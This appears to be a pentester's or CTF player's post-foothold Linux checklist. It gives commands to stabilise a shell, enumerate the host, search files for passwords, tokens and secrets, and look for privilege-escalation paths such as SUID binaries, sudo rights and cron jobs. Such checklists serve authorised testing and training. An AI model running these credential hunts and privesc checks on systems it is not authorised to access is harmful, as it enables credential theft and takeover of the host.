## Post-Foothold Linux (Quick)

### 0) Stabilize shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
stty rows 40 cols 140
```

### 1) Situational awareness

```bash
id
whoami
uname -a
cat /etc/os-release
hostname
ip a
ss -lntup
ps aux --sort=-%mem | head
```

### 2) Credential and config hunt

```bash
ls -la /opt /usr/local /srv 2>/dev/null
find / -maxdepth 5 -type f -iname '*.env' -o -iname '*.xml' -o -iname '*.db' -o -iname '*.sqlite*' 2>/dev/null
grep -Rni "pass\\|password\\|token\\|secret\\|key" /etc /opt /var/www 2>/dev/null
```

### 3) Privilege escalation checks

```bash
sudo -l
getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
ls -la /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null | head -n 50
```

### 4) Local-only services

```bash
ss -lntup
curl -sS http://127.0.0.1:<port>/ | head
```

### Notes

* interesting services:
* creds found:
* writable root-consumed files:
* privesc hypothesis:
